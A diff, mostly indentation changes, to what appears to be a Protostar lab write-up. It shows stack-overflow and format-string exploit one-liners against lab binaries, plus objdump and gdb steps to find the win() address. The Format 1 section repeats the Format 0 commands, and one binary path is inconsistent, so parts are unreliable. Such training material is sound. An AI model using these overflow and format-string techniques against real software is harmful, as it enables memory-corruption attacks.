@@ -83,7 +83,7 @@ Exercise 2
 
     Rather than reading the user-controllable data from input stream, it is read from an environment variable.
 
-     We can use the previous exploit to set the GREENIE environment variable to 0x0d0a0d0a.
+    We can use the previous exploit to set the GREENIE environment variable to 0x0d0a0d0a.
 
     *$ export GREENIE=$(python -c "print 'x'* 64 + '0d0a0d0a'.decode('hex')[::-1]"); ./stack2*
 
@@ -152,7 +152,7 @@ Exercise 4
     *$ objdump -d /opt/protos/bin/stack4 | grep win
             080483f4 &lt;win&gt;:*
 
-   So we know win() is in memory position 080483f4. We still don't know how much padding we have to add. We can find out how much.
+    So we know win() is in memory position 080483f4. We still don't know how much padding we have to add. We can find out how much.
 
 
     *(gdb) disas main
@@ -205,10 +205,10 @@ Format 0
 
     sprintf copies our user-supplied data to the buffer char array, which happens to be under the target int variable in the stack. Sprintf is vulnerable to format string.
 
-   *$/opt/protostar/bin/format0 $(python -c "print 'x'*64 + 'deadbeef'.decode('hex')[::-1]")
+    *$/opt/protostar/bin/format0 $(python -c "print 'x'*64 + 'deadbeef'.decode('hex')[::-1]")
         you have hit the target correctly :)*
 
-   The gotcha is that we need to exploit it with 10 bytes or less.
+    The gotcha is that we need to exploit it with 10 bytes or less.
 
     We can take advantage of the format string to add 64 padding 0 using %64s as follows:
 
@@ -245,13 +245,11 @@ Format 1
     We can see it only contains one text argument in the function call, therefore we have control over the format parameter.
 
     If we pass more format parameters than variable pairs the program will start poping elements from the stack.
-
     *$/opt/protostar/bin/format0 $(python -c "print 'x'*64 + 'deadbeef'.decode('hex')[::-1]")
         you have hit the target correctly :)*
 
     The gotcha is that we need to exploit it with 10 bytes or less.
 
     We can take advantage of the format string to add 64 padding 0 using %64s as follows:
-
     *$/opt/protostar/bin/format0 $(python -c "print '%64s' + 'deadbeef'.decode('hex')[::-1]")
         you have hit the target correctly :)*
